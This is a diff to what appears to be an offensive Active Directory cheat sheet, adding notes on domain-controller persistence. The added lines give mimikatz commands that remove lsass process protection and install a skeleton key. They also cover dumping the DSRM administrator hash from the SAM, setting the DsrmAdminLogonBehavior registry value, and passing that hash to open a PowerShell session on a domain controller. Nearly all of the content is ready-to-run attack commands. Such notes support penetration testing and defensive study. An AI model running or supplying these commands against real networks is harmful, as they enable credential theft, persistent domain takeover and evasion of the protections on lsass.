@@ -815,20 +815,31 @@ Rubeus.exe diamond /krbkey:<AES_krbtgt> /tgtdeleg /enctype:aes /ticketusr:admini
 Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.corporate.corp.local
 
 # Not recommended method because not opsec safe and can cause issues to AD CS
+# In case lsass is a protected process, mimikatz exe and driver are needed:
+mimikatz#  privilege::debug
+mimikatz#  !+
+mimikatz#  !processprotect /process:lsass.exe /remove
+mimikatz#  misc::skeleton
+mimikatz#  !-
 ```
 
 ### Directory Services Restore Mode (DSRM)
 
 - **Invoke-Mimikatz:**
 ```powershell
-# Command to get DSRM hash (administrator) (it is different from the hash with "lsadmp::lsa /patch")
+# DSRM is kind of local admin for Domain controller (needed for Directory Service Restore Mode)
+# DSRM hash is stored locally in the SAM: Command to get DSRM hash (administrator) is:
 Invoke-Mimikatz -Command '"privilege::debug" "lsadump::sam"' -ComputerName dcorp-dc.corporate.corp.local
+
+# Compare the hash with the administrator hash from command "lsadmp::lsa /patch": they are different
 # Once got the hash of DSRM it's possible to use it for pass the hash
-# But before a change to registry is needed (it shouldn't exist by default)
+
+# But before a change to registry is needed (permit logon from network to )
 # HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior = 2 (DWORD)
 New-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2 -PropertyType DWORD
-# Then run powershell on domain controller
-Invoke-Mimikatz -Command '"privilege::debug" “sekurlsa::pth" /domain:dcorp-dc /user:Administrator /ntlm:hash /run:powershell.exe"'
+
+# Then run powershell on domain controller (pass the hash with NTLM hash
+Invoke-Mimikatz -Command '"privilege::debug" “sekurlsa::pth" /domain:dcorp-dc /user:Administrator /ntlm:XXXX /run:powershell.exe"'
 ```
 
 ### AdminSDHolder
